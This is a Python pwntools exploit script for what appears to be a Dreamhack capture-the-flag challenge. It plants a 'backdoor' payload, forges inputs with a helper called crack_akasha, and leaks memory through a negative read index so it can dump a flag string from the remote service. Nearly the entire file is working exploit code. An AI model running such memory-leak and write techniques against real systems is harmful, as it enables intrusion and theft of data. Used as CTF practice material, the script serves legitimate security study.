backdoor_payload = "12c5425bab496041bb8eaf023a83ac020000000000c9c386"
cache = {}

from pwn import *
context.log_level = "debug"

p = remote("host8.dreamhack.games", 11585)

def setup_backdoor():
    p.sendlineafter(b"> ", b"write")
    p.sendlineafter(b": ", b"57")
    p.sendlineafter(b": ", backdoor_payload.encode())

def leak_8_bytes_payload(addr_3_low: str, addr_3_high: str) -> bytes:
    p.sendlineafter(b"> ", b"write")
    p.sendlineafter(b": ", b"58")
    p.sendlineafter(b": ", addr_3_low.encode())
    p.sendlineafter(b"> ", b"write")
    p.sendlineafter(b": ", b"59")
    p.sendlineafter(b": ", addr_3_high.encode())
    p.sendlineafter(b"> ", b"read")
    p.sendlineafter(b": ", b"-1")
    leak = int(p.recvline(), 16)
    print(f"Leaked: {hex(leak)}")
    return leak


from crack_akasha import crack_akasha

def leak_8_bytes_addr(addr: int) -> bytes:

    addr_3_low_int = addr & 0xFF_FF_FF
    addr_3_high_int = (addr >> 24) & 0xFF_FF_FF

    if addr_3_low_int in cache:
        addr_3_low = cache[addr_3_low_int]
    else:
        addr_3_low = crack_akasha(addr_3_low_int.to_bytes(3, "little").hex())
        cache[addr_3_low_int] = addr_3_low
    
    if addr_3_high_int in cache:
        addr_3_high = cache[addr_3_high_int]
    else:
        addr_3_high = crack_akasha(addr_3_high_int.to_bytes(3, "little").hex())
        cache[addr_3_high_int] = addr_3_high
    
    return leak_8_bytes_payload(addr_3_low, addr_3_high)


setup_backdoor()

str_high_payload = "3ab0f575a21a5c5293e641829738d8c00000000000dc0160"
str_low_payload = "b3d2a507cffae879ddb3f55d6338cfaf0000000000cb9d4a"
string_data_addr = leak_8_bytes_payload(str_low_payload, str_high_payload) # Leak for 0x5e2540, which is the `std::string flag` variable

i = 16
flag = b""
while True:
    leak = leak_8_bytes_addr(string_data_addr + i)
    print(p64(leak))
    i += 8
